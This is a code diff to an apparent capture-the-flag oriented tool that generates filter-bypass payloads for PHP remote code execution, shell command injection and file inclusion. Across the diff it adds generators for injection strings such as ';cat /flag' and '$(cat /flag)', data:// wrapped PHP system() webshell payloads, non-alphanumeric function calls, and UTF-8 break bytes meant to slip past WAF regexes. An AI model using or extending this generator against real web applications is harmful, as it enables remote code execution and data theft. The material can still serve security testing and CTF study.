@@ -23,6 +23,8 @@ class BypassOptions:
     upload: bool = False
     payload_context: str = "any"
     auto_context: Optional["AutoContext"] = None
+    waf_regex: str = ""
+    generator: str = "template"
 
 
 @dataclass(frozen=True)
@@ -236,6 +238,9 @@ def _is_php_style_payload(payload: str):
     if stripped.startswith("$'") or stripped.startswith('$"'):
         return False
 
+    if "$(" in stripped:
+        return False
+
     if _is_upload_wrapper_like_payload(stripped):
         return True
 
@@ -279,7 +284,27 @@ def _is_php_style_payload(payload: str):
     if "$_=" in lowered or "get_defined_vars" in lowered or "getallheaders" in lowered:
         return True
 
+    if re.match(
+        r"^[(]?[\"'](system|phpinfo|exec|passthru|shell_exec|popen|proc_open|assert|eval)[\"'][)]?[(]",
+        stripped,
+        re.I,
+    ):
+        return True
+
     return False
+
+
+PHP_STREAM_WRAPPER_PREFIXES = (
+    "php://",
+    "data://",
+    "phar://",
+    "zip://",
+    "file://",
+    "glob://",
+    "expect://",
+    "compress.zlib://",
+    "compress.bzip2://",
+)
 
 
 def _is_shell_style_payload(payload: str):
@@ -287,6 +312,9 @@ def _is_shell_style_payload(payload: str):
     if not stripped:
         return False
     if _is_upload_wrapper_like_payload(stripped):
+        return False
+    lowered = stripped.lower()
+    if any(lowered.startswith(prefix) for prefix in PHP_STREAM_WRAPPER_PREFIXES):
         return False
     return not _is_php_style_payload(stripped)
 
@@ -369,6 +397,14 @@ COMPATIBILITY_RULES = (
         max_php="7.4",
         deprecated_from="7.2",
         notes=("create_function is removed in PHP 8",),
+        compatibility_confidence="explicit",
+    ),
+    CompatibilityRule(
+        name="mb_ereg_replace_e",
+        matcher=lambda _text, lowered: "mb_ereg_replace" in lowered,
+        min_php="5.6",
+        max_php="7.4",
+        notes=("mb_ereg_replace e option is removed in PHP 8",),
         compatibility_confidence="explicit",
     ),
     CompatibilityRule(
@@ -700,10 +736,10 @@ def _is_file_path_payload(payload: str):
     lowered = stripped.lower()
     if not stripped:
         return False
-    if _is_upload_wrapper_like_payload(stripped) or _is_php_style_payload(stripped):
-        return False
     if lowered.startswith("data://"):
         return True
+    if _is_upload_wrapper_like_payload(stripped) or _is_php_style_payload(stripped):
+        return False
     decoded_forms = [lowered]
     try:
         decoded_forms.append(urllib.parse.unquote_plus(stripped).lower())
@@ -758,6 +794,20 @@ def _is_file_path_payload(payload: str):
     )
 
 
+def _ensure_php_statement(payload: str) -> str:
+    text = str(payload or "")
+    stripped = text.strip()
+    if not stripped:
+        return payload
+    if stripped.startswith("<?") or stripped.endswith("?>"):
+        return payload
+    if stripped.endswith((";", "}")):
+        return payload
+    if re.match(r"^(if|else|elseif|for|foreach|while|do|switch|try|catch|finally|function|class)\b", stripped):
+        return payload
+    return text + ";"
+
+
 def _filter_payloads_for_context(payloads, payload_context: str):
     normalized = _normalize_payload_context(payload_context)
     if normalized == "any":
@@ -768,8 +818,14 @@ def _filter_payloads_for_context(payloads, payload_context: str):
             [payload for payload in payloads if _is_file_path_payload(payload)]
         )
 
-    matcher = _is_eval_safe_php_payload if normalized == "php_code" else _is_shell_style_payload
-    filtered = [payload for payload in payloads if matcher(payload)]
+    if normalized == "php_code":
+        normalized_payloads = []
+        for payload in payloads:
+            if _is_eval_safe_php_payload(payload):
+                normalized_payloads.append(_ensure_php_statement(payload))
+        return utils.dedupe_preserve_order(normalized_payloads)
+
+    filtered = [payload for payload in payloads if _is_shell_style_payload(payload)]
     return utils.dedupe_preserve_order(filtered)
 
 
@@ -1024,6 +1080,10 @@ def _generate_php_rce_payloads(command: str, php_version: object, disabled_funct
 
         payloads.append(_build_chr_exec_payload(func, command))
 
+    noalnum_call = utils.generate_noalnum_call("system", command)
+    if noalnum_call:
+        payloads.append(noalnum_call)
+
     if "popen" in bypass_data.PHP_EXEC_WRAPPERS and "popen" not in disabled:
         payloads.append(_build_popen_payload(command))
         payloads.append(_build_popen_chr_payload(command))
@@ -1074,6 +1134,55 @@ def _render_argument_injection_payloads(options: "BypassOptions"):
     return rendered
 
 
+def _render_fixed_prefix_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None or not getattr(ctx, "fixed_command_prefix", ""):
+        return []
+    if options.payload_context not in {"shell_command", "any"}:
+        return []
+    path = options.flagfile or "/flag"
+    commands = [f"cat {path}", f"nl {path}", f"tac {path}"]
+    wildcard = _wildcard_bypass(path)
+    if wildcard and wildcard != path:
+        commands.extend([f"cat {wildcard}", f"nl {wildcard}"])
+    out = []
+    for cmd in commands:
+        for sep in (";", "|", "&&"):
+            out.append(f"{sep}{cmd}")
+        out.append(f"$({cmd})")
+        out.append(f"`{cmd}`")
+        out.append(f"\n{cmd}")
+        out.append(f"{cmd};#")
+    return utils.dedupe_preserve_order(out)
+
+
+def _render_include_suffix_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    suffix = str(getattr(ctx, "include_suffix", "") or "") if ctx is not None else ""
+    if not suffix:
+        return []
+    if options.payload_context not in {"file_path", "any"}:
+        return []
+    path = options.flagfile or "/flag"
+    code = f"<?php system('cat {path}');?>"
+    return [f"data://text/plain,{code}"]
+
+
+def _render_utf8_break_payloads(options: "BypassOptions"):
+    if not utils.regex_has_utf8_flag(options.waf_regex):
+        return []
+    path = options.flagfile or "/flag"
+    byte = utils.UTF8_BREAK_BYTE
+    out = []
+    if options.payload_context in {"shell_command", "any"}:
+        for cmd in (f"cat {path}", f"nl {path}", f"tac {path}"):
+            out.append(f"{cmd};#{byte}")
+            out.append(f"{cmd} #{byte}")
+    elif options.payload_context == "php_code":
+        out.append(f"system('cat {path}');#{byte}")
+    return utils.dedupe_preserve_order(out)
+
+
 def _render_sanitizer_aware_payloads(options: "BypassOptions"):
     ctx = options.auto_context
     if ctx is None or not ctx.sanitizers:
@@ -1097,6 +1206,20 @@ def _render_sanitizer_aware_payloads(options: "BypassOptions"):
     return out
 
 
+def _render_callback_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None or ctx.sink_kind != "command_exec":
+        return []
+    if _normalize_payload_context(options.payload_context) not in {"php_code", "any"}:
+        return []
+    path = options.flagfile or "/flag"
+    command = f"cat {path}"
+    return [
+        _safe_format(template, cmd=command)
+        for template in bypass_data.AUTO_CALLBACK_EXEC_TEMPLATES
+    ]
+
+
 def _render_precise_webshell_payloads(options: "BypassOptions"):
     ctx = options.auto_context
     if ctx is None:
@@ -1104,9 +1227,7 @@ def _render_precise_webshell_payloads(options: "BypassOptions"):
     out = []
     path = options.flagfile or "/flag"
     key = ctx.input_key or "x"
-    if ctx.sink_function in {"eval", "assert"} or (
-        ctx.sink_function == "" and ctx.input_key
-    ):
+    if ctx.sink_kind == "file_write_upload" and ctx.input_key:
         for tpl in bypass_data.AUTO_PRECISE_EVAL_TEMPLATES:
             out.append(_safe_format(tpl, key=key, path=path))
     if ctx.sink_function in {"include", "include_once", "require", "require_once"} or ctx.sink_kind == "php_include":
@@ -1272,8 +1393,12 @@ def _render_preprocessor_wrapped(options: "BypassOptions", existing):
 def _generate_auto_only_candidates(options: "BypassOptions", base_candidates):
     out = []
     out.extend(_render_argument_injection_payloads(options))
+    out.extend(_render_fixed_prefix_payloads(options))
+    out.extend(_render_utf8_break_payloads(options))
+    out.extend(_render_include_suffix_payloads(options))
     out.extend(_render_sanitizer_aware_payloads(options))
     out.extend(_render_precise_webshell_payloads(options))
+    out.extend(_render_callback_payloads(options))
     out.extend(_render_file_read_path_payloads(options))
     out.extend(_render_null_byte_file_read_payloads(options))
     out.extend(_render_url_decode_file_read_payloads(options))
@@ -1398,7 +1523,11 @@ def generate_candidates(options: BypassOptions):
                 payloads.append(_base64_pipe_bypass(payload))
 
     if not root_discovery_mode and not options.upload:
-        simple_cmds = ["ls", "cat /flag", "tac /flag", "env"]
+        simple_cmds = []
+        if options.flagfile and options.flagfile != "/":
+            simple_cmds.extend([f"cat {options.flagfile}", f"tac {options.flagfile}"])
+        if options.read_env:
+            simple_cmds.append("env")
         for cmd in simple_cmds:
             payloads.append(_octal_encode(cmd))
 
@@ -1406,6 +1535,12 @@ def generate_candidates(options: BypassOptions):
     if options.auto_context is not None:
         auto_only = _generate_auto_only_candidates(options, payloads)
         payloads.extend(auto_only)
+
+    generator = str(getattr(options, "generator", "") or "template").strip().lower()
+    if generator in {"planner", "hybrid"}:
+        from . import planner
+
+        payloads.extend(planner.plan_for_options(options))
 
     candidates = utils.dedupe_preserve_order(payloads)
     candidates = [payload for payload in candidates if payload != "`/`"]
@@ -1434,6 +1569,7 @@ def filter_payloads(
     verbose=False,
     progress_callback=None,
     trace_callback=None,
+    allow_utf8_break=False,
 ):
     passed = []
     progress = ProgressBar(len(payloads), verbose=verbose) if show_progress else None
@@ -1450,7 +1586,14 @@ def filter_payloads(
                     "passed": len(passed),
                 }
             )
-        allowed = utils.is_payload_allowed(payload, waf_words, waf_chars, waf_regex, limit_length)
+        allowed = utils.is_payload_allowed(
+            payload,
+            waf_words,
+            waf_chars,
+            waf_regex,
+            limit_length,
+            allow_utf8_break=allow_utf8_break,
+        )
         if trace_callback:
             event = {
                 "type": "filter",
